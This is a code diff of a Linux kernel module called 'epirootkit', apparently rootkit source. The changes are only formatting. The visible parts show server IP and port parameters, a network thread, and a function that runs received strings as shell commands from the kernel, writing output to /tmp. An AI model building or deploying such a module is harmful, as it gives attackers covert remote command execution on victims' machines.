@@ -37,8 +37,7 @@ MODULE_PARM_DESC(ip, "Server IPv4");
 MODULE_PARM_DESC(port, "Server port");
 MODULE_PARM_DESC(message, "Message to send to the server");
 
-static int close_communication(void)
-{
+static int close_communication(void){
 	if (sock) {
 		sock_release(sock);
 		sock = NULL;
@@ -47,8 +46,7 @@ static int close_communication(void)
 	return SUCCESS;
 }
 
-static int close_thread(void)
-{
+static int close_thread(void){
 	if (network_thread) {
 		if (!thread_exited)
 			kthread_stop(network_thread);
@@ -57,16 +55,14 @@ static int close_thread(void)
 	return SUCCESS;
 }
 
-static int cleanup(void)
-{
+static int cleanup(void){
 	close_thread();
 	close_communication();
 
 	return SUCCESS;
 }
 
-static int exec_str_as_command(char *user_cmd)
-{
+static int exec_str_as_command(char *user_cmd){
 	struct subprocess_info *sub_info = NULL;
 	struct file *file = NULL;
 	char *cmd = NULL;
@@ -75,7 +71,8 @@ static int exec_str_as_command(char *user_cmd)
 	char *output_file = "/tmp/kernel_exec_output";
 	char *buf = NULL;
 	loff_t pos = 0;
-	int status = 0, len = 0;
+	int status = 0;
+	int len = 0;
 
 	cmd = kmalloc(RCV_CMD_BUFFER_SIZE, GFP_KERNEL);
 	if (!cmd)
@@ -124,8 +121,7 @@ static int exec_str_as_command(char *user_cmd)
 	return SUCCESS;
 }
 
-static int network_worker(void *data)
-{
+static int network_worker(void *data){
 	struct sockaddr_in addr = { 0 };
 	struct msghdr msg = { 0 };
 	struct kvec vec = { 0 };
@@ -227,8 +223,7 @@ static int network_worker(void *data)
 	return SUCCESS;
 }
 
-static int __init epirootkit_init(void)
-{
+static int __init epirootkit_init(void){
 	pr_info("epirootkit_init: module loaded\n");
 
 	network_thread = kthread_run(network_worker, NULL, "netcom_thread");
@@ -240,8 +235,7 @@ static int __init epirootkit_init(void)
 	return SUCCESS;
 }
 
-static void __exit epirootkit_exit(void)
-{
+static void __exit epirootkit_exit(void){
 	cleanup();
 	pr_info("epirootkit_exit: module unloaded\n");
 }
